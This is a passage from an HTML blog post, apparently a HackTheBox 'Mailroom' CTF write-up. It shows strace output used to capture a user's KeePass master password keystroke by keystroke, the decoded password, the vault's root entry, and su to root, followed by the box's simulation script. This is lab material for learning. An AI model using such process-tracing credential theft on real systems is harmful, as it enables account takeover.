+</span></span><span class="line"><span class="cl">read(3, &#34;e&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;w&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;/&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;p&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;e&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;r&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;s&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;o&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;n&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;a&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;l&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;.&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;k&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;d&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;b&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;x&#34;, 1)                         = 1
+</span></span><span class="line"><span class="cl">read(3, &#34;\n&#34;, 1)                        = 1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here at the start, we can see the keepass file being accessed.
+The next section has what looks to be probably the master password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">read(0, &#34;!&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;s&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;E&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;c&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;U&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;r&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;3&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;p&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;4&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;$&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;$&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;w&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;0&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;1&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;\10&#34;, 8192)                    = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;r&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;d&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;9&#34;, 8192)                      = 1
+</span></span><span class="line"><span class="cl">read(0, &#34;\n&#34;, 8192)                     = 1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="acessing-the-keepass-vault--troubleshooting-the-password">Acessing the keepass vault &amp; troubleshooting the password</h3>
+<p>The line <code>&quot;\10&quot;</code> sticks out as odd, since this is reporting 1 character/keystroke at a time. If we exclude that input, the password becomes <code>!sEcUr3p4$$w01rd9</code>.  Trying this password does not work, but looking at the password itself the <code>1</code> seems out of place: the password appears to be the words <code>secure</code> and <code>password</code>. Omitting <code>1</code> gives us a working password: <code>!sEcUr3p4$$w0rd9</code>, and now the <code>\10</code> character becomes more clear: the user must have inputted a 1 as a mistake, then deleted it with backspace. The deletion keystroke appeared in the trace as <code>\10</code>, and the password was fixed for login purposes.</p>
+<p>Viewing the keepass vault shows multiple password entries, but one is clearly more noteworthy than the rest: the root account.</p>
+<p><img src="/post/hackthebox-mailroom/Images/KeepassVault.PNG"
+	width="1073"
+	height="223"
+	srcset="/post/hackthebox-mailroom/Images/KeepassVault_hu7e23e6d2c4fdc8e5c6be13ce2c68b15f_87685_480x0_resize_box_3.PNG 480w, /post/hackthebox-mailroom/Images/KeepassVault_hu7e23e6d2c4fdc8e5c6be13ce2c68b15f_87685_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+		alt="Keepass Vault"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="481"
+		data-flex-basis="1154px"
+	
+></p>
+<p>We can right click and select <code>copy password</code> to temporarily place the password into our clipboard, or we can view the password plain through <code>edit entry</code>:</p>
+<p><img src="/post/hackthebox-mailroom/Images/RootPass.PNG"
+	width="804"
+	height="372"
+	srcset="/post/hackthebox-mailroom/Images/RootPass_hu096e740ea4404b1d1aa3d6889fd9c577_94895_480x0_resize_box_3.PNG 480w, /post/hackthebox-mailroom/Images/RootPass_hu096e740ea4404b1d1aa3d6889fd9c577_94895_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="518px"
+	
+></p>
+<p>With this, we can <code>su</code> to root straight from matthew:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">matthew@mailroom:~$ su
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">root@mailroom:/home/matthew#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Bonus: inspecting the scripts from the root folder shows that the <code>\10</code> char is indeed a deletion</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pexpect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## This script is used to simulate matthew logging into his database in real time</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">send_human</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;open </span><span class="si">{</span><span class="n">db_path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">k</span><span class="o">.</span><span class="n">expect</span><span class="p">(</span><span class="s1">&#39;Please provide the master password: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">send_human</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="s1">&#39;!sEcUr3p4$$w01</span><span class="se">\010</span><span class="s1">rd9&#39;</span><span class="p">)</span>  <span class="c1"># \010 is a del character</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="reflection">Reflection</h2>
+<p>As my first live hard box completion, I was thoroughly impressed by the complexity of the attack chain leveraged to gain a foothold. Between the constant abuse of XSS to the extremely frequent <code>kpcli</code> processes, this box might not be the most realistic, but I enjoyed every trick utilized throughout. I also appreciated the &ldquo;leaked code&rdquo; viewable on the git subdomain, and how it is used to showcase multiple different code vulnerabilities used at different spots within this box.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/gitea/">Gitea</a>
+        
+            <a href="/tags/keepass/">Keepass</a>
+        
+            <a href="/tags/command-injection/">Command Injection</a>
+        
+            <a href="/tags/xss/">XSS</a>
+        
+            <a href="/tags/nosql-injection/">NoSQL Injection</a>
+        
+            <a href="/tags/strace/">strace</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-busqueda/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-busqueda/Busqueda.fc4856cd6b9e5aa954d7face3968a69d_hucd7cd900a381e6f396b4d3fd74d99876_352215_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Busqueda"
+                        
+                        data-hash="md5-/EhWzWueWqlU1/rOOWimnQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Busqueda</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-agile/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-agile/Agile.e64eb2d34a7a6346f24c5fd437dde6f0_hu5e06ffde2f95e1276a1510a6a2985d71_363689_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Agile"
+                        
+                        data-hash="md5-5k6y00p6Y0byTF/UN93m8A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Agile</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-socket/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-socket/Socket.b5f448cb0b8111b44376a9763dfc88f8_hu849eb59558b706146747b24028bb82f3_354031_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Socket"
+                        
+                        data-hash="md5-tfRIywuBEbRDdql2PfyI&#43;A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Socket</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-inject/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-inject/Inject.9f9716c1200516310e6e4cd98e20c139_hu12ac3957f7a126ac06ec9338f7d84355_333068_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Inject"
+                        
+                        data-hash="md5-n5cWwSAFFjEObkzZjiDBOQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Inject</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 Spencer&#39;s Blog
+    </section>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#xss-vulnerability-found-in-contact-submission-form">XSS vulnerability found in contact submission form</a></li>
+        <li><a href="#sensitive-gitea-repository-accessible-in-a-subdomain">Sensitive Gitea repository accessible in a subdomain</a>
+          <ol>
+            <li><a href="#information-on-a-private-subdomain-is-leaked">Information on a private subdomain is leaked</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#leveraging-xss-to-reach-the-private-subdomain">Leveraging XSS to reach the private subdomain</a></li>
+        <li><a href="#abusing-nosql-injection-to-leak-credentials">Abusing NoSQL injection to leak credentials</a></li>
+      </ol>
+    </li>
+    <li><a href="#access-as-user-tristan">Access as user tristan</a>
+      <ol>
+        <li><a href="#enumerating-the-private-webpage-directly-through-port-forwarding">Enumerating the private webpage directly through port forwarding</a></li>
+        <li><a href="#remote-code-execution-through-command-injection">Remote Code Execution through Command Injection</a></li>
+      </ol>
+    </li>
+    <li><a href="#lateral-movement">Lateral Movement</a>
+      <ol>
+        <li><a href="#enumerating-docker-container-as-www-data">Enumerating docker container as www-data</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#enumerating-system-as-matthew">Enumerating system as matthew</a></li>
+        <li><a href="#using-strace-to-monitor-processes-in-real-time">Using strace to monitor processes in real time</a></li>
+        <li><a href="#acessing-the-keepass-vault--troubleshooting-the-password">Acessing the keepass vault &amp; troubleshooting the password</a></li>
+      </ol>
+    </li>
+    <li><a href="#reflection">Reflection</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+
+    </body>
+</html>
